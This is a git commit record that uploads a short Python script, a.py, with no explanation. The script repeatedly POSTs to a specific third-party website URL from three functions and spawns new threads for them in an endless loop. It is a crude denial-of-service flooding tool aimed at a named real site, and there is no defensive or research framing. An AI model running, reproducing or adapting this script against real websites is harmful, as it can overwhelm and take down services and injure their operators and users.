45f2632f0ca3d6659532aa29ea7ffccaa3541b8a
Tempy3 <96894495+Tempy3@users.noreply.github.com>
2022-01-08 03:10:11 +0000

    Add files via upload

---
+++ a.py
@@ -0,0 +1,30 @@
+import requests
+import time
+import threading
+import random
+
+URL1 = 'https://www.amad.org.br/'
+
+def trouble():
+    try:
+        r = requests.post(URL1)
+        print(r.status_code)
+    except Exception as e:
+        print(str(e))
+def trouble2():
+    try:
+        r = requests.post(URL1)
+        print(r.status_code)
+    except Exception as e:
+        print(str(e))
+def trouble3():
+    try:
+        r = requests.post(URL1)
+        print(r.status_code)
+    except Exception as e:
+        print(str(e))
+
+while True:
+    threading.Thread(target=trouble).start()
+    threading.Thread(target=trouble2).start()
+    threading.Thread(target=trouble3).start()
